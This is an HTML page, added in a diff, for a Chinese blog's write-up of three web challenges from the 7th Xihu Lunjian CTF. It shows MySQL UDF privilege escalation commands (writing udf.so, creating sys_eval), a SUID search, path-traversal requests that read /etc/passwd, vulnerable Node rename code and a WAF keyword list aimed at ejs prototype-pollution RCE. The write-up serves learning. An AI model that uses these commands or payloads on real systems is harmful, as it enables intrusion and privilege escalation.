@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            西湖论剑-7th
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h1><p>考点：</p>
+<p>mysql服务端读取客户端文件</p>
+<p>mysql udf提权</p>
+<p>刚好，都是会的，基本操作。</p>
+<p>mysql服务端读取客户端文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rain99-/p/13334755.html">https://www.cnblogs.com/Rain99-/p/13334755.html</a></p>
+<p>工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server/releases/tag/v1.0.1">https://github.com/rmb122/rogue_mysql_server/releases/tag/v1.0.1</a></p>
+<p>读query.php源码，得到靶机mysql服务的账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// mine</span><br><span class="line">// $db_host = &#x27;127.0.0.1&#x27;;</span><br><span class="line">// $db_username = &#x27;root&#x27;;</span><br><span class="line">// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;</span><br><span class="line">// $db_name = &#x27;mysql&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>连接靶机的mysql，执行命令。</p>
+<p><code>show databases;</code>有一个secret数据库，查出这个数据库的flag字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag</span><br><span class="line"></span><br><span class="line">DASCTF&#123;3386201718692</span><br><span class="line"></span><br><span class="line">Try to become ROOT</span><br></pre></td></tr></table></figure>
+
+<p>接下来是udf提权。</p>
+<p><code>show variables like &#39;%priv%&#39;</code></p>
+<p><code>show variables like &#39;%plugin%&#39;</code></p>
+<p><code>select 0x... into dumpfile &quot;/usr/lib/mysql/p1ugin/udf.so&quot;</code></p>
+<p><code>create function sys_eval returns string soname &#39;udf.so&#39;;</code></p>
+<p><code>select sys_eval(&quot;whoami&quot;);</code></p>
+<p>mysql用户。然后以为要suid提权</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br></pre></td></tr></table></figure>
+
+<p>flag在环境变量里</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/gcsis-7th/image-20240130215131065.png" alt="image-20240130215131065.png"></p>
+<h1 id="Easyejs-unsolved"><a href="#Easyejs-unsolved" class="headerlink" title="Easyejs - unsolved"></a>Easyejs - unsolved</h1><p>考点：</p>
+<p>putil_merge，原型链污染 <a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487">https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487</a></p>
+<p>ejs结合原型链污染rce</p>
+<p>写这题时候我感觉做的比较好的一个点就是去猜测后端功能是怎么实现的。</p>
+<p>上传文件接口<code>/upload</code>，上传文件返回文件uuid。</p>
+<p>读取文件接口<code>/file</code>，根据uuid读文件</p>
+<p>重命名文件接口<code>/rename</code>，提交数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;oldFileName&quot;:&quot;&quot;,</span><br><span class="line">    &quot;newFileName&quot;:&quot;&quot;,</span><br><span class="line">    &quot;uuid&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看所有文件<code>/list</code>，返回结果是uuid-&gt;filename的dict。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;fe3ce007-ba3d-4682-a875-3092eefa910c&quot;:&quot;3&quot;,</span><br><span class="line">    &quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;f776a54d-dab7-4979-baaf-cab47cfd354c&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;c6e725cf-40cd-4c8f-b94e-2924d735ef5b&quot;:&quot;1.txt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发送以下数据给<code>/rename</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;oldFileName&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;newFileName&quot;:&quot;../1.txt&quot;,</span><br><span class="line">    &quot;uuid&quot;:&quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回重命名失败。访问<code>/file</code>，uuid带上面这个，提示文件不存在。但是<code>/list</code>显示的结果有这一条：<code>&quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot; : &quot;../1.txt&quot;</code>。</p>
+<p>多次测试<code>/rename</code>，得出：uuid和oldFileName要对应，且oldFileName要在原来的dict存在，重命名才能成功。</p>
+<p>测一下这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;oldFileName&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;newFileName&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">    &quot;uuid&quot;:&quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后去读，提示文件不存在。</p>
+<p>到这里我停下来思考，<code>/list</code>的dict估计是一整个存在内存里的，要取文件时候uuid做key取出文件名。既然如此，重命名接口返回的重命名失败估计没有影响，只要dict里存在即可。存在同名文件，说明有别的手段防止文件名冲突。这里我猜的是文件uuid作为文件目录，原文件就放在这个目录下。读取文件时把uuid拼到前面即可。所以要读<code>/etc/passwd</code>得穿越一下<code>../../../../../../../../../etc/passwd</code>。我猜对了。</p>
+<p>后面就是读cmdline获得源码位置，读源码，读package.json得到依赖版本。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;cookie-parser&quot;: &quot;^1.4.6&quot;,</span><br><span class="line">    &quot;ejs&quot;: &quot;^3.1.5&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.18.2&quot;,</span><br><span class="line">    &quot;express-fileupload&quot;: &quot;^1.4.3&quot;,</span><br><span class="line">    &quot;jsonwebtoken&quot;: &quot;^9.0.2&quot;,</span><br><span class="line">    &quot;lodash&quot;: &quot;^4.17.4&quot;,</span><br><span class="line">    &quot;multer&quot;: &quot;^1.4.5-lts.1&quot;,</span><br><span class="line">    &quot;putil-merge&quot;: &quot;^3.6.0&quot;,</span><br><span class="line">    &quot;rpc&quot;: &quot;^3.3.3&quot;,</span><br><span class="line">    &quot;sqlite3&quot;: &quot;^5.1.7-rc.0&quot;,</span><br><span class="line">    &quot;uuid&quot;: &quot;^9.0.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来大致浏览一下源码，看见<code>putil-merge</code>里的<code>merge</code>和res.render，再结合题目的ejs，思路直接锁定ejs结合原型链污染rce。</p>
+<p>但是我想着能不能走捷径，把ejs模板文件覆盖掉，直接rce。</p>
+<p>有可能覆盖的地方有两处：</p>
+<p>上传时候的文件名。这里看似没有检查，实际上使用的文件上传组件自动消除路径穿越了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.post(&#x27;/upload&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    const file = req.files.file;</span><br><span class="line">    const uniqueFileName = uuidv4();</span><br><span class="line">    const destinationPath = path.join(__dirname, &#x27;uploads&#x27;, file.name);</span><br><span class="line">    // 将文件写入 uploads 目录</span><br><span class="line">    fs.writeFileSync(destinationPath, file.data);</span><br><span class="line">    global.fileDictionary[uniqueFileName] = file.name;</span><br><span class="line">    res.send(uniqueFileName);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>以及rename，这里检查<code>..</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.post(&#x27;/rename&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    if (req.body.oldFileName &amp;&amp; req.body.newFileName &amp;&amp; req.body.uuid)&#123;</span><br><span class="line">        oldFileName = req.body.oldFileName</span><br><span class="line">        newFileName = req.body.newFileName</span><br><span class="line">        uuid = req.body.uuid</span><br><span class="line">        if (waf(oldFileName)  &amp;&amp; waf(newFileName) &amp;&amp;  waf(uuid))&#123;</span><br><span class="line">            uniqueFileName = findKeyByValue(global.fileDictionary,oldFileName)</span><br><span class="line">            console.log(typeof uuid);</span><br><span class="line">            if (uniqueFileName == uuid)&#123;</span><br><span class="line">                putil_merge(global.fileDictionary,&#123;[uuid]:newFileName&#125;,&#123;deep:true&#125;)</span><br><span class="line">                if(newFileName.includes(&#x27;..&#x27;))&#123;</span><br><span class="line">                    res.send(&#x27;文件重命名失败！！！&#x27;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    fs.rename(__dirname+&quot;/uploads/&quot;+oldFileName, __dirname+&quot;/uploads/&quot;+newFileName, (err) =&gt; &#123;</span><br><span class="line">                        if (err) &#123;</span><br><span class="line">                            res.send(&#x27;文件重命名失败！&#x27;);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            res.send(&#x27;文件重命名成功！&#x27;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                res.send(&#x27;文件重命名失败！&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            res.send(&#x27;哒咩哒咩！&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        res.send(&#x27;文件重命名失败！&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>所以我就一直硬在想如何覆盖ejs。后来lolita说newFileName可以传数组，我才恍然大悟。测试后发现不行，估计是views没有写权限。</p>
+<p>直到比赛结束了我才想起来，最开始的那条路。我真是sb。而且他还有一个waf，也告诉我要用原型链。只能说不熟悉ejs rce导致的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function waf(data) &#123;</span><br><span class="line">            data = JSON.stringify(data)</span><br><span class="line">            if (data.includes(&#x27;outputFunctionName&#x27;) || data.includes(&#x27;escape&#x27;) || data.includes(&#x27;delimiter&#x27;) || data.includes(&#x27;localsName&#x27;)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后来搭建docker环境复现，顺便学了一下远程docker debug nodejs，把ejs落下的功课补上。原型链复现完成后复现覆盖ejs，如果有写权限的话，newFileName传数组则可以覆盖index.ejs。</p>
+<h1 id="ezerp-unsolved"><a href="#ezerp-unsolved" class="headerlink" title="ezerp - unsolved"></a>ezerp - unsolved</h1><p>题目环境V3.3，网上搜的洞貌似没3.3，去github仓库看到issue有V3.3的sql注入和文件上传，按照poc打都不生效，便放弃了。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#only-sql"><span class="toc-text">only_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easyejs-unsolved"><span class="toc-text">Easyejs - unsolved</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezerp-unsolved"><span class="toc-text">ezerp - unsolved</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
